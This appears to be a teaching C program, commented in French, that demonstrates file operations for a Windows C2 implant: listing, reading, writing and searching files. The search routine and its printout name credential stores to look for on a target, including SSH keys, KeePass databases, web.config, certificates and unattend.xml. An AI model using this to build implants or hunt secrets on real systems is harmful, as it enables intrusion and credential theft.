/*
 * OBJECTIF  : Operations fichiers pour un agent C2
 * PREREQUIS : Windows File API, CreateFile, FindFirstFile
 * COMPILE   : cl example.c /Fe:example.exe
 *
 * Un agent C2 doit pouvoir lister, lire, ecrire, telecharger
 * et uploader des fichiers sur la cible.
 */

#include <windows.h>
#include <stdio.h>
#include <shlwapi.h>

#pragma comment(lib, "shlwapi.lib")

void demo_file_listing(void) {
    printf("[1] Listing de fichiers (commande 'ls')\n\n");

    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA("C:\\Windows\\*.ini", &fd);
    if (hFind == INVALID_HANDLE_VALUE) {
        printf("    [-] Aucun fichier trouve\n\n");
        return;
    }

    int count = 0;
    printf("    %-12s %-20s %s\n", "TAILLE", "DATE", "NOM");
    printf("    %-12s %-20s %s\n", "------", "----", "---");
    do {
        SYSTEMTIME st;
        FileTimeToSystemTime(&fd.ftLastWriteTime, &st);
        DWORD size = fd.nFileSizeLow;
        char type = (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? 'd' : '-';

        printf("    %c %9lu  %04d-%02d-%02d %02d:%02d  %s\n",
               type, size, st.wYear, st.wMonth, st.wDay,
               st.wHour, st.wMinute, fd.cFileName);
        count++;
    } while (FindNextFileA(hFind, &fd) && count < 10);
    FindClose(hFind);
    printf("    (%d fichiers affiches)\n\n", count);
}

void demo_file_read(void) {
    printf("[2] Lecture de fichier (commande 'download')\n\n");

    const char* path = "C:\\Windows\\System32\\drivers\\etc\\hosts";
    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("    [-] Impossible d'ouvrir %s\n\n", path);
        return;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    printf("    [+] Fichier: %s (%lu bytes)\n", path, fileSize);

    /* Lire les premiers 512 octets */
    char buf[513] = {0};
    DWORD toRead = fileSize < 512 ? fileSize : 512;
    DWORD bytesRead = 0;
    ReadFile(hFile, buf, toRead, &bytesRead, NULL);
    CloseHandle(hFile);

    printf("    [+] Lu %lu bytes (extrait):\n", bytesRead);
    printf("    ---\n");
    /* Afficher les 3 premieres lignes */
    int lines = 0;
    char* p = buf;
    while (*p && lines < 3) {
        char* nl = strchr(p, '\n');
        if (nl) {
            *nl = '\0';
            printf("    %s\n", p);
            p = nl + 1;
        } else {
            printf("    %s\n", p);
            break;
        }
        lines++;
    }
    printf("    ---\n\n");
}

void demo_file_write(void) {
    printf("[3] Ecriture de fichier (commande 'upload')\n\n");

    /* Ecrire dans un fichier temporaire */
    char tempPath[MAX_PATH], tempFile[MAX_PATH];
    GetTempPathA(sizeof(tempPath), tempPath);
    GetTempFileNameA(tempPath, "c2_", 0, tempFile);

    HANDLE hFile = CreateFileA(tempFile, GENERIC_WRITE, 0,
                               NULL, CREATE_ALWAYS, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("    [-] Impossible de creer le fichier\n\n");
        return;
    }

    const char* data = "Contenu uploade par l'agent C2\r\nLigne 2\r\n";
    DWORD written;
    WriteFile(hFile, data, (DWORD)strlen(data), &written, NULL);
    CloseHandle(hFile);
    printf("    [+] Fichier cree: %s\n", tempFile);
    printf("    [+] Ecrit %lu bytes\n", written);

    /* Nettoyage */
    DeleteFileA(tempFile);
    printf("    [+] Fichier supprime (nettoyage demo)\n\n");
}

void demo_file_search(void) {
    printf("[4] Recherche de fichiers (commande 'search')\n\n");

    /* Rechercher des fichiers interessants */
    const char* patterns[] = {
        "C:\\Users\\*\\Desktop\\*.txt",
        "C:\\Users\\*\\Documents\\*.docx",
        "C:\\Users\\*\\.ssh\\*",
        NULL
    };

    printf("    Patterns de recherche typiques :\n");
    int i;
    for (i = 0; patterns[i]; i++) {
        WIN32_FIND_DATAA fd;
        HANDLE h = FindFirstFileA(patterns[i], &fd);
        int found = (h != INVALID_HANDLE_VALUE);
        if (found) FindClose(h);
        printf("    [%c] %s\n", found ? '+' : '-', patterns[i]);
    }

    printf("\n    Fichiers sensibles a chercher :\n");
    printf("    - *.kdbx       (KeePass)\n");
    printf("    - id_rsa       (cles SSH)\n");
    printf("    - *.rdp        (connexions RDP sauvegardees)\n");
    printf("    - web.config   (credentials ASP.NET)\n");
    printf("    - *.pfx, *.p12 (certificats)\n");
    printf("    - unattend.xml (mots de passe d'install)\n\n");
}

void demo_file_info(void) {
    printf("[5] Informations sur un fichier\n\n");

    const char* path = "C:\\Windows\\notepad.exe";
    WIN32_FILE_ATTRIBUTE_DATA info;
    if (GetFileAttributesExA(path, GetFileExInfoStandard, &info)) {
        SYSTEMTIME ct, mt;
        FileTimeToSystemTime(&info.ftCreationTime, &ct);
        FileTimeToSystemTime(&info.ftLastWriteTime, &mt);
        ULARGE_INTEGER size;
        size.HighPart = info.nFileSizeHigh;
        size.LowPart = info.nFileSizeLow;

        printf("    Fichier  : %s\n", path);
        printf("    Taille   : %llu bytes\n", size.QuadPart);
        printf("    Creation : %04d-%02d-%02d %02d:%02d\n",
               ct.wYear, ct.wMonth, ct.wDay, ct.wHour, ct.wMinute);
        printf("    Modif    : %04d-%02d-%02d %02d:%02d\n",
               mt.wYear, mt.wMonth, mt.wDay, mt.wHour, mt.wMinute);
        printf("    Attributs: 0x%08lX", info.dwFileAttributes);
        if (info.dwFileAttributes & FILE_ATTRIBUTE_HIDDEN) printf(" HIDDEN");
        if (info.dwFileAttributes & FILE_ATTRIBUTE_SYSTEM) printf(" SYSTEM");
        if (info.dwFileAttributes & FILE_ATTRIBUTE_READONLY) printf(" READONLY");
        printf("\n");
    } else {
        printf("    [-] Impossible de lire %s\n", path);
    }
    printf("\n");
}

int main(void) {
    printf("[*] Demo : File Operations Agent C2\n");
    printf("[*] ==========================================\n\n");
    demo_file_listing();
    demo_file_read();
    demo_file_write();
    demo_file_search();
    demo_file_info();
    printf("[+] Exemple termine avec succes\n");
    return 0;
}
